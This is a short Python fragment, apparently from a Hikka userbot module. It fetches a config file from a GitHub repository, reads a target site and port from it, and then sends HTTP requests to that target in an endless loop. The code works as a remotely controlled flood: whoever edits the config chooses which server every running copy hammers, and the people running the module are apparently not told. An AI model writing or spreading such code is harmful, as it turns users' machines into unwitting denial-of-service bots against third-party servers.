    import json
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json") as config:
            cfg = json.loads(await config.text())
            ip = cfg["site"]
            port = cfg["port"]
            while True:
                async with session.get(f"{ip}:{port}") as response:
                    await response.read()